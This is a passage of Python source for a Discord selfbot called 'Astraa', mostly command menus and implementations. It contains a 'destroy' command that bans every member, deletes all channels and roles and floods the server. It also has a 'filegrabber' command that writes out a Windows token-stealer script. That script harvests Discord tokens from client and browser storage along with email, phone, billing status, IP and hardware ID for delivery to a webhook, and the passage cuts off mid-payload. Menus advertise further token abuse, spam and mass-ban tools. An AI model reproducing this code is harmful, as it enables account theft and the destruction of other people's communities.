> :broom: `{Astraa.command_prefix}clear`\n*Sends a large message filled with invisible unicode*
> :placard: `{Astraa.command_prefix}sendall <message>`\n*Sends a message in every channel*
> :mouse_three_button: `{Astraa.command_prefix}copycat <user>`\n*Copies the users messages ({Astraa.copycat})*
> :no_entry_sign: `{Astraa.command_prefix}stopcopycat`\n*Stops copycatting*
> :speaking_head: `{Astraa.command_prefix}genname`\n*Generate a fake name*
> :gear: `{Astraa.command_prefix}geoip <ip>`\n*Looks up the ip's location*
> :globe_with_meridians: `{Astraa.command_prefix}pingweb <website-url>`\n*Pings a website to see if it's up*
> :page_with_curl: `{Astraa.command_prefix}read`\n*Marks all messages as read*
> :cyclone: `{Astraa.command_prefix}gentoken <user>`\n*Returns the user's token*
> :camera: `{Astraa.command_prefix}av <link>`\n*Search a profile picture*
> :boomerang: `{Astraa.command_prefix}whois <user>`\n*Returns user's account info*
> :no_entry: `{Astraa.command_prefix}quickdelete <message>`\n*Quickly delete your message after sending it*
> :ghost: `{Astraa.command_prefix}ghost`\n*Makes your name and pfp invisible*
> :scissors: `{Astraa.command_prefix}setpfp <link>`\n*Sets the image-link as your pfp*"""
        embed_2 = f"""> :art: `{Astraa.command_prefix}hexcolor #<hex-code>`\n*Returns the color of the hex-code*
> :telephone_receiver: `{Astraa.command_prefix}tts <content>`\n*Returns an mp4 file of your content*
> :pencil: `{Astraa.command_prefix}firstmsg`\n*Shows the first message in the channel history*
> :capital_abcd: `{Astraa.command_prefix}abc`\n*Cyles through the alphabet*
> :1234: `{Astraa.command_prefix}100`\n*Cycles -100*
> :clock5: `{Astraa.command_prefix}hastbin <message>`\n*Instantly creates a hastbin with your message*
> :paintbrush: `{Astraa.command_prefix}ascii <message>`\n*Creates an ASCII art of your message*
> :recycle: `{Astraa.command_prefix}cyclenick <text>`\n*Cycles through your nickname by letter*
> :x: `{Astraa.command_prefix}stopcyclenick`\n*Stops cycling your nickname*
> :movie_camera: `{Astraa.command_prefix}stream <status>`\n*Sets your streaming status*
> :joystick: `{Astraa.command_prefix}playing <status>`\n*Sets your playing status*
> :notes: `{Astraa.command_prefix}listening <status>`\n*Sets your listening status*
> :tv: `{Astraa.command_prefix}watching <status>`\n*Sets your watching status*
> :name_badge: `{Astraa.command_prefix}stopactivity`\n*Resets your status-activity*
> :confetti_ball: `{Astraa.command_prefix}rolecolor <role>`\n*Returns the role's color*"""
        await ctx.send(embed_1)
        await ctx.send(embed_2, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "atio":
        embed = f"""**ATIO COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :boom: `{Astraa.command_prefix}destroy`\n*Nuke a discord server*
> :magnet: `{Astraa.command_prefix}filegrabber <webhook>`\n*Send a Token Grabber File*
> :boom: `{Astraa.command_prefix}tokenfuck <token>`\n*Destroy a Account with his token*
> :page_facing_up: `{Astraa.command_prefix}tokeninfo <token>`\n*Scrape info with a token*
> :recycle: `{Astraa.command_prefix}autolog <token>`\n*Log in to the account automatically*
> :broom: `{Astraa.command_prefix}cleardm <amount>`\n*Delete all dm with a user*
> :house: `{Astraa.command_prefix}hypesquad <house>`\n*Change your hypesquad badge*
> :page_facing_up: `{Astraa.command_prefix}serverinfo`\n*Get all infos about a discord server*
> :crystal_ball: `{Astraa.command_prefix}nitro`\n*Generates a random nitro code*
> :wastebasket: `{Astraa.command_prefix}webhookremove <webhook>`\n*Delete the selected webhook*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "exploit":
        embed = f"""**EXPLOIT COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :detective: `{Astraa.command_prefix}hide <display> <hidden>`\n*Hide messages inside other messages*
> :wrench: `{Astraa.command_prefix}edit <message>`\n*Move the position of the (edited) tag*
> :lock: `{Astraa.command_prefix}bypassblock <usesrid>`\n*Message Discord users you have blocked*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "fun":
        embed = f"""**FUN COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :vhs: `{Astraa.command_prefix}gif <query>`\n*Sends a gif based on the query*
> :city_sunset: `{Astraa.command_prefix}image <query>`\n*Returns an image*
> :airplane: `{Astraa.command_prefix}9/11`\n*Sends a 9/11 attack*
> :sweat_drops: `{Astraa.command_prefix}cum`\n*Makes you cum*
> :bird: `{Astraa.command_prefix}tweet <user> <message>`\n*Makes a fake tweet*
> :magic_wand: `{Astraa.command_prefix}magik <user>`\n*Distorts the specified user*
> :compass: `{Astraa.command_prefix}fry <user>`\n*Deep-fry the specified user*
> :mag: `{Astraa.command_prefix}blurpify <user>`\n*Blurpifies the specified user*
> :orange_circle: `{Astraa.command_prefix}phcomment <user> <message>`\n*Makes a fake PornHub comment*
> :detective: `{Astraa.command_prefix}hack <user>`\n*Hacks the user*
> :bomb: `{Astraa.command_prefix}minesweeper`\n*Play a game of minesweeper*
> :dark_sunglasses: `{Astraa.command_prefix}1337speak <message>`\n*Talk like a hacker*
> :straight_ruler: `{Astraa.command_prefix}wyr`\n*Sends a would you rather*
> :bar_chart: `{Astraa.command_prefix}poll <msg: xyz 1: xyz 2: xyz>`\n*Creates a poll*
> :speech_balloon: `{Astraa.command_prefix}topic`\n*Sends a conversation starter*
> :eggplant: `{Astraa.command_prefix}dick <user>`\n*Returns the user's dick size*
> :recycle: `{Astraa.command_prefix}reverse <message>`\n*Sends the message but in reverse-order*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "server":
        embed = f"""**SERVER COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :mouse_three_button: `{Astraa.command_prefix}copyguild`\n*Duplicate a guild*
> :bell: `{Astraa.command_prefix}massmention <message>`\n*Mass mention users in a server*
> :door: `{Astraa.command_prefix}massban`\n*Mass ban users in a server*
> :key: `{Astraa.command_prefix}massunban`\n*Mass unban users in a server*
> :t_rex: `{Astraa.command_prefix}dynoban <user>`\n*Ban a user with dyno*
> :broom: `{Astraa.command_prefix}masskick`\n*Mass kick users in a server*
> :plunger: `{Astraa.command_prefix}massrole`\n*Mass create roles in a server*
> :no_entry_sign: `{Astraa.command_prefix}delrole`\n*Mass delete roles in a server*
> :do_not_litter: `{Astraa.command_prefix}delchannels`\n*Mass delete channels in a server*
> :writing_hand: `{Astraa.command_prefix}spam <amount>`\n*Spams a message*
> :clown: `{Astraa.command_prefix}wizz`\n*Makes a prank message about wizzing*
> :barber: `{Astraa.command_prefix}guildicon`\n*Scrape Guild icon*
> :city_sunset: `{Astraa.command_prefix}banner`\n*Scrape Guild banner*
> :crayon: `{Astraa.command_prefix}renamechannels <name>`\n*Rename all channels in a server*
> :pencil2: `{Astraa.command_prefix}servername <name>`\n*Rename server*
> :pen_ballpoint: `{Astraa.command_prefix}nickall <name>`\n*Rename everyone in a server*
> :paperclip: `{Astraa.command_prefix}massreact <emoji>`\n*Mass reacts with the specified emoji*
> :wastebasket: `{Astraa.command_prefix}purge <amount>`\n*Purges the amount of messages*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "friend":
        embed = f"""**FRIEND COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :white_check_mark: `{Astraa.command_prefix}acceptfriends`\n*Accepts all friend requests*
> :zzz: `{Astraa.command_prefix}ignorefriends`\n*Ignores all friends requests*
> :x: `{Astraa.command_prefix}delfriends`\n*Removes all your friends*
> :wastebasket: `{Astraa.command_prefix}clearblocked`\n*Clears your block-list*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "group":
        embed = f"""**GROUP COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :no_pedestrians: `{Astraa.command_prefix}kickgc`\n*Kick all users from group*
> :door: `{Astraa.command_prefix}leavegroups`\n*Leave a group*
> :wastebasket: `{Astraa.command_prefix}gcleave`\n*Delete you message in a group*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "meme":
        embed = f"""**MEME COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :dog: `{Astraa.command_prefix}dog`\n*Display a dog*
> :cat: `{Astraa.command_prefix}cat`\n*Display a cat*
> :hamster: `{Astraa.command_prefix}sadcat`\n*Display a sadcat*
> :bird: `{Astraa.command_prefix}bird`\n*Display a bird*
> :fox: `{Astraa.command_prefix}fox`\n*Display a fox*
> :poultry_leg: `{Astraa.command_prefix}feed <user>`\n*Display a feed*
> :point_right: `{Astraa.command_prefix}tickle <user>`\n*Display a tickle*
> :hand_splayed: `{Astraa.command_prefix}slap <user>`\n*Display a slap*
> :heart: `{Astraa.command_prefix}hug <user>`\n*Display a hug*
> :people_hugging: `{Astraa.command_prefix}cuddle <user>`\n*Display a cuddle*
> :grimacing: `{Astraa.command_prefix}smug <user>`\n*Display a smug*
> :thumbsup: `{Astraa.command_prefix}pat <user>`\n*Display a pat*
> :kiss: `{Astraa.command_prefix}kiss <user>`\n*Display a kiss*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    elif str(category).lower() == "message":
        embed = f"""**MESSAGE COMMANDS | Prefix: `{Astraa.command_prefix}`**\n
> :slight_smile: `{Astraa.command_prefix}shrug`\n*Returns ¯\_(ツ)_/¯*
> :smile: `{Astraa.command_prefix}lenny`\n*Returns ( ͡° ͜ʖ ͡°)*
> :hushed: `{Astraa.command_prefix}fliptable`\n*returns (╯°□°）╯︵ ┻━┻*
> :unamused: `{Astraa.command_prefix}unflip`\n*returns ┬─┬ ノ( ゜-゜ノ)*
> :muscle: `{Astraa.command_prefix}bold <message>`\n*Bolds the message*
> :lock: `{Astraa.command_prefix}censor <message>`\n*Censor the message*
> :construction: `{Astraa.command_prefix}underline <message>`\n*Underline the message*
> :upside_down: `{Astraa.command_prefix}italicize <message>`\n*Italicize the message*
> :no_entry_sign: `{Astraa.command_prefix}strike <message>`\n*Strike the message*
> ::level_slider:: `{Astraa.command_prefix}quote <message>`\n*Quote the message*
> :keyboard: `{Astraa.command_prefix}code <message>`\n*Code the message*
> :ghost: `{Astraa.command_prefix}empty`\n*Send a empty message*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))


#General commands
#Change SelfBot prefix
@Astraa.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    if prefix is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}prefix <prefix>')
        return
    Astraa.command_prefix = str(prefix)

#Shows how long you have been using the SelfBot
@Astraa.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)

#Pinging yourself
@Astraa.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")

#Disconnect from SlefBot
@Astraa.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Astraa.logout()


#Useful commands
#Print my Network
@Astraa.command()
async def astraa(ctx):
    await ctx.message.delete()
    embed = f"""**MY SOCIAL NETWORKS | Prefix: `{Astraa.command_prefix}`**\n
> :pager: `Discord Server`\n*https://dsc.gg/astraadev*
> :computer: `GitHub Page`\n*https://github.com/AstraaDev*
> :robot: `SelfBot Project`\n*https://github.com/AstraaDev/Discord-SelfBot*
> :bird: `Twitter`\n*https://twitter.com/astraadev*"""
    await ctx.send(embed, file=discord.File("Images/astraa.gif"))

#Clear channel messages
@Astraa.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')

#Send a message in all channels
@Astraa.command()
async def sendall(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}senall <message>')
        return
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except Exception as e:
        await ctx.send(f"[ERROR]: {e}")

#Start copying user messages
@Astraa.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}copycat <user>')
        return
    Astraa.copycat = user
    await ctx.send("Now copying **" + str(Astraa.copycat) + "**")

#Stop copying user messages
@Astraa.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Astraa.user is None:
        await ctx.send("Start by copying a user...")
        return
    await ctx.send("Stopped copying **" + str(Astraa.copycat) + "**")
    Astraa.copycat = None

#Generate a random name
@Astraa.command(aliases=["fakename"])
async def genname(ctx):
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

#Locate a ip address
@Astraa.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.1.1.1'):
    await ctx.message.delete()
    try:
        r = requests.get(f'http://ip-api.com/json/{ipaddr}')
        geo = r.json()
        embed = f"""**GEOLOCATE IP | Prefix: `{Astraa.command_prefix}`**\n
> :pushpin: `IP`\n*{geo['query']}*
> :globe_with_meridians: `Country-Region`\n*{geo['country']} - {geo['regionName']}*
> :department_store: `City`\n*{geo['city']} ({geo['zip']})*
> :map: `Latitute-Longitude`\n*{geo['lat']} - {geo['lon']}*
> :satellite: `ISP`\n*{geo['isp']}*
> :robot: `Org`\n*{geo['org']}*
> :alarm_clock: `Timezone`\n*{geo['timezone']}*
> :electric_plug: `As`\n*{geo['as']}*"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
    except Exception as e:
        await ctx.send(f"[ERROR]: {e}")

#Ping a Website
@Astraa.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}pingweb <website>')
        return
    try:
        r = requests.get(website).status_code
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
    if r == 404:
        await ctx.send(f'Website **down** *({r})*', delete_after=3)
    else:
        await ctx.send(f'Website **operational** *({r})*', delete_after=3)

#Mark as read a channel
@Astraa.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in Astraa.guilds:
        await guild.ack()

#Gen a Fake token
@Astraa.command()
async def gentoken(ctx, user: discord.Member=None):
    await ctx.message.delete()
    code = "ODA"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    if user is None:
        await ctx.send(''.join(code))
        return
    await ctx.send(user.mention + " token is: " + "".join(code))

#Search a image on google
@Astraa.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    format = "gif"
    if user is None:
        user = ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

#Returns user's account info
@Astraa.command()
async def whois(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    if isinstance(ctx.message.channel, discord.Guild):
        date_format = "%a, %d %b %Y %I:%M %p"
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        userrole = 0
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            userrole = "Roles [{}]".format(len(user.roles) - 1)

        embed = f"""**{user.mention} INFORMATIONS | Prefix: `{Astraa.command_prefix}`**\n
> :dividers: __Basic Information__\n\tUsername: `{str(user)}`\n\tUser ID: `{str(user.id)}`\n\tCreation Date: `{user.created_at.strftime(date_format)}`\n\tAvatar URL: `{user.avatar_url if user.avatar_url else "None"}`
> :crystal_ball: __Server Information__\n\tJoined: `{user.joined_at.strftime(date_format)}`\n\tJoin position: `{str(members.index(user) + 1)}`\n\t{userrole if userrole else " "} `{role_string if role_string > 1 else "None"}`\n\Permissions: `{perm_string if perm_string else "None"}`"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))

    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        embed = f"""**{user.mention} INFORMATIONS | Prefix: `{Astraa.command_prefix}`**\n
> :dividers: __Basic Information__\n\tUsername: `{str(user)}`\n\tUser ID: `{str(user.id)}`\n\tCreation Date: `{user.created_at.strftime(date_format)}`\n\tAvatar URL: `{user.avatar_url if user.avatar_url else "None"}`"""
        await ctx.send(embed, file=discord.File("Images/astraa.gif"))
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)

#Quickly delete your message
@Astraa.command(aliases=["del", "quickdel"])
async def quickdelete(ctx, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}quickdelete <message>')
        return
    await ctx.send(message, delete_after=2)

#Become a ghost
@Astraa.command()
async def ghost(ctx):
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        ctx.send(f"[ERROR]: You didnt put your password in the config.json file")
        return
    password = config.get('password')
    with open('Images/transparent.png', 'rb') as f:
        try:
            await Astraa.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
        except discord.HTTPException as e:
            await ctx.send(f"[ERROR]: {e}")

#Change your profile picture with a link
@Astraa.command(name='set-pfp', aliases=['setpfp', 'pfpset,"changepfp'])
async def set_pfp(ctx, *, url=None):
    await ctx.message.delete()
    if url is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}setpfp <url>')
        return
    if config.get('password') == 'password-here':
        await ctx.send(f"[ERROR]: You didnt put your password in the config.json file")
    else:
        password = config.get('password')
        with open('Images/PFP-1.png', 'wb') as f:
            r = requests.get(url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
    try:
        Image.open('Images/PFP-1.png').convert('RGB')
        with open('Images/PFP-1.png', 'rb') as f:
            await Astraa.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
        await ctx.send(f"[ERROR]: {e}")

#Get an overview of a hexacolor
@Astraa.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
async def get_color(ctx, *, color: discord.Colour=None):
    await ctx.message.delete()
    if color is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}hexcolor <color>')
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'{str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em)

#TTS a texte
@Astraa.command()
async def tts(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}tts <message>')
        return
    try:
        buff = await do_tts(message)
        await ctx.send(file=discord.File(buff, f"{message}.wav"))
    except Exception as e:
        await ctx.send(f'[ERROR]: {e}')

#Go back to the first message of the channel
@Astraa.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def first_message(ctx, channel: discord.TextChannel=None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    try:
        first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
        await ctx.send(f"First Message of {channel.mention}: {first_message.jump_url}")
    except Exception as e:
        await ctx.send(f'[ERROR]: {e}')

#Recite the alphabet
@Astraa.command()
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

#Count from 0 to 100
@Astraa.command(aliases=["100"])
async def _100(ctx):
    await ctx.message.delete()
    message = await ctx.send("Starting count to **100**")
    await asyncio.sleep(2)
    for i in range(100):
        await message.edit(content=i)
        await asyncio.sleep(2)

#Display the price of btc
@Astraa.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    embed = f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`"
    await ctx.send(embed)

#Instantly creates a hastbin
@Astraa.command()
async def hastebin(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}hastebin <message>')
        return
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

#Create a script that displays your message in ascii 
@Astraa.command(aliases=["fancy"])
async def ascii(ctx, *, text=None):
    await ctx.message.delete()
    if text is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}ascii <text>')
        return
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")

#Cycle your nickname
@Astraa.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def cyclenick(ctx, *, text=None):
    await ctx.message.delete()
    global cycling
    cycling = True
    if text is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}cyclenick <name>')
        return
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)

#Stop cycle your nickname
@Astraa.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
async def stopcyclenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False

#Start streaming
@Astraa.command(aliases=["streaming"])
async def stream(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}stream <message>')
        return
    stream = discord.Streaming(name=message, url=stream_url)
    await Astraa.change_presence(activity=stream)

#Start playing
@Astraa.command(alises=["game"])
async def playing(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}playing <message>')
        return
    game = discord.Game(name=message)
    await Astraa.change_presence(activity=game)

#Start listening
@Astraa.command(aliases=["listen"])
async def listening(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}listening <message>')
        return
    await Astraa.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))

#Start wathcing
@Astraa.command(aliases=["watch"])
async def watching(ctx, *, message=None):
    await ctx.message.delete()
    if message is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}watching <message>')
        return
    await Astraa.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=message))

#Stop your current activity
@Astraa.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Astraa.change_presence(activity=None, status=discord.Status.dnd)

#Scrape hexcode of a role
@Astraa.command(name='rolecolor')
async def role_hexcode(ctx, *, role: discord.Role):
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")


#ATIO commands
#Nuke a discord server
@Astraa.command(aliases=["rekt", "nuke"])
async def destroy(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))),
            description="sry <3",
            reason="sry <3",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="sry <3")
    for _i in range(250):
        randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
        await ctx.guild.create_role(name="sry <3", color=randcolor)

#Send a Token Grabber File
@Astraa.command(aliases=["grabfile", "tokenfile"])
async def filegrabber(ctx, webhook=None):
    await ctx.message.delete()
    if webhook is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {Astraa.command_prefix}filegrabber <webhook>')
        return
    try:
        with open(f"printer.py", "w") as file:
            file.write("""import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\\\Discord",
    "Discord Canary"    : ROAMING + "\\\\discordcanary",
    "Discord PTB"       : ROAMING + "\\\\discordptb",
    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
